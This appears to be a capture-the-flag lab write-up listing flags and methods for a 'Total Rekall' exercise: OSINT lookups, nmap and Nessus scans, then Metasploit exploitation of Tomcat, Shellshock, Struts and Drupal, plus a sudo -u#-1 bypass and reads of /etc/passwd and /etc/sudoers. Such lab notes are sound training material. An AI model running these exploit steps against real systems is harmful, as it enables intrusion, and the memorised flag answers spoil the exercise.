with `docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}} {{.Name}}' $(docker ps -aq)` got the IP addresses 
```
192.168.13.12 /container_3
192.168.13.10 /container_1
192.168.13.14 /container_5
192.168.13.11 /container_2
192.168.13.13 /container_4
```

this gives us hostname
`docker inspect --format='{{.Config.Hostname}} {{.Name}}' $(docker ps -aq)`


```markdown
# Linux CTF Challenge: Flag Solutions and Methods

## Initial Enumeration Commands
```bash
# Get Docker container IPs and names
docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}} {{.Name}}' $(docker ps -aq)

# Results:
192.168.13.12 /container_3
192.168.13.10 /container_1
192.168.13.14 /container_5
192.168.13.11 /container_2
192.168.13.13 /container_4

# Get Docker container hostnames
docker inspect --format='{{.Config.Hostname}} {{.Name}}' $(docker ps -aq)
```

## OSINT Flags (1-3)

### Flag 1: `h8s692hskasd`
- **Location**: centralops.net/DomainDossier
- **Vulnerability**: OSINT - Exposed WHOIS Data
- **Method**: 
  1. Visit https://centralops.net/co/DomainDossier.aspx
  2. Search for `totalrekall.xyz`
  3. Find flag in Registrant Street field

### Flag 2: `34.102.136.180`
- **Method**: 
  ```bash
  ping totalrekall.xyz
  ```

### Flag 3: `s7euwehd`
- **Location**: crt.sh
- **Vulnerability**: OSINT - SSL Certificate Data
- **Method**: 
  1. Visit crt.sh
  2. Search for `totalrekall.xyz`
  3. Find subdomain `s7euwehd.totalrekall.xyz`

## Network Scanning Flags (4-6)

### Flag 4: `5`
- **Method**: Network enumeration
  ```bash
  nmap 192.168.13.0/24
  ```
- **Answer**: 5 hosts (excluding scanner)

### Flag 5: `192.168.13.13`
- **Method**: Aggressive scan
  ```bash
  nmap -A 192.168.13.0/24
  ```
- **Answer**: Host running Drupal

### Flag 6: `97610`
- **Method**: 
  1. Run Nessus scan on 192.168.13.12
  2. Find critical Apache Struts vulnerability
  3. Note vulnerability ID (97610)

## Exploitation Flags (7-12)

### Flag 7: `8ks6sbhss`
- **Location**: 192.168.13.10
- **Vulnerability**: Apache Tomcat RCE (CVE-2017-12617)
- **Method**:
  ```bash
  msfconsole
  search tomcat_jsp
  use multi/http/tomcat_jsp_upload_bypass
  set RHOST 192.168.13.10
  exploit
  shell
  cat /root/.flag7.txt
  ```

### Flag 8: `9dnx5shdf5`
- **Location**: 192.168.13.11
- **Vulnerability**: Shellshock
- **Method**:
  ```bash
  msfconsole
  use exploit/multi/http/apache_mod_cgi_bash_env_exec
  set TARGETURI /cgi-bin/shockme.cgi
  set RHOST 192.168.13.11
  exploit
  cat /etc/sudoers
  ```

### Flag 9: `wudks8f7sd`
- **Location**: 192.168.13.11
- **Method**: 
  ```bash
  cat /etc/passwd
  ```

### Flag 10: `wjasdufsdkg`
- **Location**: 192.168.13.12
- **Vulnerability**: Apache Struts (CVE-2017-5638)
- **Method**:
  ```bash
  msfconsole
  use multi/http/struts2_content_type_ognl
  set RHOSTS 192.168.13.12
  exploit
  sessions -i <session_number>
  download /root/flagisinThisfile.7z
  7z x flagisinThisfile.7z
  cat flag.txt
  ```

### Flag 11: `www-data`
- **Location**: 192.168.13.13
- **Vulnerability**: Drupal (CVE-2019-6340)
- **Method**:
  ```bash
  msfconsole
  use unix/webapp/drupal_restws_unserialize
  set RHOSTS 192.168.13.13
  exploit
  getuid
  ```

### Flag 12: `d7sdfksdf384`
- **Location**: 192.168.13.14
- **Vulnerability**: Sudo Bypass (CVE-2019-14287)
- **Method**:
  ```bash
  ssh alice@192.168.13.14  # password: alice
  sudo -u#-1 cat /root/flag12.txt
  ```

## Summary of Vulnerabilities
1. OSINT Data Exposure
2. Network Service Misconfiguration
3. Apache Tomcat RCE
4. Shellshock
5. Apache Struts RCE
6. Drupal RCE
7. Sudo Bypass

## Tools Used
- Network Scanning: `nmap`, Nessus
- OSINT: centralops.net, crt.sh
- Exploitation: Metasploit Framework
- Post-Exploitation: SSH, sudo
